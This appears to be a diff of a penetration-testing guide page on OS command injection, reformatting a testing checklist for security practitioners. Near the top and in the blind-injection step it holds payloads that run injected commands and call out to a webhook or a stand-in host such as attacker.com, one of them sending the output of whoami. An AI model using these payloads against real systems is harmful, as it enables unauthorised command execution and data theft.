@@ -34,16 +34,43 @@ category: injection
    `& nslookup webhook.site/<id>?`whoami` &`
 
 ### Checklist
-[ ]  Determine the technology stack: Which operating system and server software are in use?  
-[ ]  Identify potential injection points: URL parameters, form fields, HTTP headers, etc.  
-[ ]  Test for simple injections with special characters like `;`, `&&`, `||`, and `|`. Test for injection within command arguments.  
-[ ]  Test for blind command injection, where output is not returned in the response. If output isn't directly visible, try creating outbound requests (e.g. using ping or curl).  
-[ ]  Try to escape from any restriction mechanisms, like quotes or double quotes.  
-[ ]  Test with a list of potentially dangerous functions/methods (like `exec()`, `system()`, `passthru()` in PHP, or `exec`, `eval` in Node.js).  
-[ ]  Test for command injection using time delays (`ping -c localhost`).  
-[ ]  Test for command injection using `&&`, `||`, and `;`.  
-[ ]  Test with common command injection payloads, such as those from PayloadsAllTheThings.  
-[ ]  If there's a filter in place, try to bypass it using various techniques like encoding, command splitting, etc.  
+<details markdown="1">
+  <summary>Click me to expand checklist</summary>  
+  1. **Determine the technology stack?**  
+     * Which operating system and server software are in use?  
+    
+  2. **Verify injection points**  
+      * URL parameters
+      * Form fields (e.g., login forms or search boxes)  
+      * HTTP headers (e.g., cookies, user-agent, authorization token, X-Forwarded-For, etc.)  
+    
+  3. **Test for simple injections with special characters** (`;`, `&&`, `||`, and `|`).
+      * Test for injection within command arguments.  
+    
+  4. **Test for blind command injection**  
+      * If output isn't directly visible, try creating outbound requests.  
+      * ping: `;ping+-c+10+127.0.0.1`  
+      * curl: `;curl+http://attacker.com/log`  
+      * Webhook  
+  
+  5. **Try to escape from any restriction mechanisms**
+      * Inject a `'` or `"` to prematurely terminate the quoted string.
+
+  7. **Test with a list of potentially dangerous functions/methods**
+      * PHP: `exec()`, `system()`, `passthru()`
+      * Node.js: `exec`, `eval`
+
+  8. **Test for command injection using time delays**
+      * e.g., `ping -c 10 localhost`  
+
+  10. **Test with common command injection payloads:**  
+      * [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)  
+
+  11. **Try to bypass filter using various techniques**
+      * encoding
+      * command splitting (e.g., `;`, `&&`, `|`)
+      * etc.  
+</details>
 
 ## Example-1 Command Injection
 
